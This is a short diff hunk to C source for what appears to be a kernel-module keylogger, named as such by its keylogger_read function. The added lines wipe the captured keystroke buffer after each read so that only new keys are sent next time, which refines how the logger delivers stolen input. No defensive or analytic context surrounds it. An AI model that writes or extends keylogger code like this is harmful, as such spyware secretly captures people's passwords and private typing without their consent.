@@ -41,6 +41,10 @@ static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count,
         return -EFAULT;
     }
 
+    // After a read - clean buffer so we only send new keys next time
+    memset(key_buffer, 0, sizeof(key_buffer));
+    key_index = 0;
+
     *ppos = len;
     return len;
 }
